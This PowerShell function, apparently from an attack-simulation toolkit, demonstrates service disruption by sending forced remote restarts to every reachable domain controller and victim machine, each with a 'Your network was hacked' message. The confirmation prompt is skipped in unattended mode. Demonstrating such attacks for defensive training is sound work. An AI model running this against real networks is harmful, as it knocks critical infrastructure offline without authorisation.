<#
.SYNOPSIS
Demonstrates service disruption by requesting forced restarts of reachable configured victim machines.

.FUNCTIONALITY
Demonstrates service disruption by requesting forced restarts of reachable configured victim machines.
Uses the configured restart delay and warning message, skips the local computer, and reports unreachable targets.
#>
function Restart-VictimMachines {

    $Info = Measure-FunctionRuntime -Begin

    Write-AS2GoOutput -Type Header -Message "Restart-VictimMachines"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

    #Write-AS2GoOutput -Type Header -Message "TRY to reboot all DCs and Victim machine"

    $Script:AllDCs | Select-Object Online, Root_Domain, FQDN, RODC, OperatingSystem | ft

    $UseCase = Get-ASConfig -Setting "usecase"
    $commment = "$UseCase | Your network was hacked. All machines will be rebooted in $Script:ASTime2Reboot seconds!!!!"

    write-host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "shutdown ", "/r /f /t ", "$Script:ASTime2Reboot ", "/c ", "$commment"  `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
    Write-Host  ""   

    If (-not $UnAttended) {
        $answer = show-decisionprompt
    }
    else {
        $answer = $Script:Yes
    }


    If ($answer -eq $Script:Yes) {

        $commment = "$UseCase | Your network was hacked. `nAll machines will be rebooted in $Script:ASTime2Reboot seconds!!"

        foreach ($computer in $Script:AllDCs) {
            $remotemachine = $computer.FQDN
            $os = $computer.operatingSystem

            # check if the computer is online
            IF (Test-Connection -BufferSize 32 -Count 1 -ComputerName $remotemachine -Quiet) {

                If ($env:COMPUTERNAME -ne $computer.name) {
                    If ($os -like 'Windows 1*') {
                        # only for Windows 10 machines
                        Write-AS2GoOutput -Type Bullet -Message "Try to reboot Windows PC     - $remotemachine"
                        net use \\$remotemachine\ipc$
                        shutdown /r /f /c $commment /t $Script:ASTime2Reboot /m \\$remotemachine
                    }
                    elseif ($os -like 'Windows 7*') {
                        Write-AS2GoOutput -Type Bullet -Message "Try to reboot Windows PC     - $remotemachine"
                        shutdown /r /f /c $commment /t $Script:ASTime2Reboot /m \\$remotemachine
                    }
                    else {
                        Write-AS2GoOutput -Type Bullet -Message "Try to reboot Windows Server - $remotemachine"
                        shutdown /r /f /c $commment /t $Script:ASTime2Reboot /m \\$remotemachine
                    }
                }
            } #end if Test-Connection
            Else {
                Write-AS2GoOutput -Type Warning -Message "Remote machine $remotemachine is down!"
            } 

        } 
    }


    Measure-FunctionRuntime -End -Details $Info
}
